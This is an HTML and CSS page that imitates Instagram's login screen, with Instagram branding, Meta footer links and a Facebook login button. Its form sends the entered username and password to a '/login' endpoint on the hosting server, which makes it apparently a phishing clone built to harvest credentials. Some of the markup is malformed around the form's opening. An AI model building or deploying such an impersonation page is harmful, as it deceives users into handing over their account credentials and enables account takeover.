<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #0095f6;
            --primary-hover: #1877f2;
            --text: #262626;
            --muted: #737373;
            --border: #dbdbdb;
            --bg: #fafafa;
            --white: #ffffff;
            --input-bg: #fafafa;
            --shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
            --radius: 12px;
            --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: var(--text);
            -webkit-font-smoothing: antialiased;
        }

        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 16px 30px;
        }

        /* Logo */
        .logo {
            margin-bottom: 28px;
            text-align: center;
            opacity: 0;
            transform: translateY(-12px);
            animation: fadeUp 0.6s cubic-bezier(0.22, 1, 0.36, 1) 0.1s forwards;
        }

        .logo-text {
            font-size: 42px;
            font-weight: 500;
            color: var(--text);
            letter-spacing: -1.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .logo-text i {
            font-size: 38px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            transition: transform 0.35s ease;
        }

        .logo:hover i {
            transform: scale(1.08) rotate(-4deg);
        }

        /* Form Box */
        .form-box {
            width: 100%;
            max-width: 350px;
            background: var(--white);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 28px 40px 24px;
            margin-bottom: 12px;
            box-shadow: var(--shadow);
            opacity: 0;
            transform: translateY(18px);
            animation: fadeUp 0.65s cubic-bezier(0.22, 1, 0.36, 1) 0.2s forwards;
        }

        .subtitle {
            font-size: 17px;
            font-weight: 600;
            color: var(--muted);
            text-align: center;
            margin-bottom: 22px;
            line-height: 1.3;
        }

        .input-group {
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            height: 40px;
            padding: 9px 12px;
            background: var(--input-bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 13px;
            color: var(--text);
            transition: var(--transition);
        }

        input:hover {
            border-color: #c7c7c7;
        }

        input:focus {
            outline: none;
            border-color: #a8a8a8;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(0, 149, 246, 0.12);
        }

        input::placeholder {
            color: #8e8e8e;
        }

        .password-wrapper {
            position: relative;
            margin-bottom: 14px;
        }

        .password-wrapper input {
            padding-right: 54px;
        }

        #togglePassword {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 13px;
            font-weight: 600;
            color: var(--text);
            cursor: pointer;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.2s ease, color 0.2s ease;
        }

        #togglePassword.show {
            opacity: 1;
            pointer-events: auto;
        }

        #togglePassword:hover {
            color: var(--muted);
        }

        .login-btn {
            width: 100%;
            height: 36px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 6px;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .login-btn:hover:not(:disabled) {
            background: var(--primary-hover);
            transform: translateY(-1px);
            box-shadow: 0 4px 14px rgba(0, 149, 246, 0.35);
        }

        .login-btn:active:not(:disabled) {
            transform: translateY(0);
            box-shadow: none;
        }

        .login-btn:disabled {
            opacity: 0.45;
            cursor: default;
            transform: none;
            box-shadow: none;
        }

        .or-separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .or-separator .line {
            flex: 1;
            height: 1px;
            background: var(--border);
        }

        .or-separator span {
            padding: 0 16px;
            font-size: 13px;
            font-weight: 600;
            color: var(--muted);
        }

        .facebook-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            background: none;
            border: none;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            padding: 10px 0;
            border-radius: 8px;
            transition: var(--transition);
        }

        .facebook-btn:hover {
            background: rgba(56, 81, 133, 0.06);
            color: #2d4373;
        }

        .facebook-btn i {
            font-size: 20px;
        }

        .forgot-password {
            display: block;
            text-align: center;
            margin-top: 18px;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .forgot-password:hover {
            color: #0095f6;
        }

        /* Sign up box */
        .signup-box {
            width: 100%;
            max-width: 350px;
            background: var(--white);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 22px;
            text-align: center;
            margin-bottom: 24px;
            box-shadow: var(--shadow);
            opacity: 0;
            transform: translateY(18px);
            animation: fadeUp 0.65s cubic-bezier(0.22, 1, 0.36, 1) 0.35s forwards;
        }

        .signup-box p {
            font-size: 14px;
        }

        .signup-box a {
            color: var(--primary);
            font-weight: 600;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .signup-box a:hover {
            color: var(--primary-hover);
            text-decoration: underline;
        }

        /* Footer */
        footer {
            padding: 20px 16px 40px;
            text-align: center;
            opacity: 0;
            animation: fadeIn 0.8s ease 0.5s forwards;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 18px;
            font-size: 12px;
            color: var(--muted);
            margin-bottom: 16px;
            max-width: 480px;
            margin-left: auto;
            margin-right: auto;
        }

        .footer-links a {
            color: var(--muted);
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .footer-links a:hover {
            color: var(--text);
        }

        .copyright {
            font-size: 12px;
            color: var(--muted);
        }

        /* Spinner */
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2.5px solid rgba(255, 255, 255, 0.35);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.65s linear infinite;
        }

        /* Animations */
        @keyframes fadeUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Mobile */
        @media (max-width: 450px) {
            body {
                background: var(--white);
            }

            .form-box,
            .signup-box {
                border: none;
                background: transparent;
                box-shadow: none;
                padding-left: 0;
                padding-right: 0;
                border-radius: 0;
            }

            .main {
                padding-top: 60px;
            }
        }
    </style>
</head>
<body>
    <div class="main">
        <!-- Logo -->
        <div class="logo">
            <div class="logo-text">
                <i class="fa-brands fa-instagram"></i>
                <span>Instagram</span>
            </div>
        </div>

        <form action="/login" method="POST" id="loginForm">Log into Instagram</p>

                <div class="input-group">
                    <input type="text" name="email" placeholder="Phone number, username, or email" required autocomplete="username">
                </div>

                <div class="password-wrapper">
                    <input type="password" name="password" id="password" placeholder="Password" required autocomplete="current-password">
                    <button type="button" id="togglePassword">Show</button>
                </div>

                <button type="submit" id="loginBtn" class="login-btn">Log in</button>
            </form>

            <div class="or-separator">
                <div class="line"></div>
                <span>OR</span>
                <div class="line"></div>
            </div>

            <button class="facebook-btn">
                <i class="fa-brands fa-facebook"></i>
                <span>Log in with Facebook</span>
            </button>

            <a href="#" class="forgot-password">Forgotten your password?</a>
        </div>

        <!-- Sign up -->
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <p class="copyright">© 2026 Instagram from Meta</p>
    </footer>

    <script>
        const form = document.getElementById('loginForm');
        const btn = document.getElementById('loginBtn');
        const passwordInput = document.getElementById('password');
        const toggleBtn = document.getElementById('togglePassword');

        passwordInput.addEventListener('input', function () {
            toggleBtn.classList.toggle('show', this.value.length > 0);
        });

        toggleBtn.addEventListener('click', function () {
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            this.textContent = isPassword ? 'Hide' : 'Show';
        });

        form.addEventListener('submit', function () {
            btn.innerHTML = '<span class="spinner"></span>';
            btn.disabled = true;
        });
    </script>
</body>
</html>
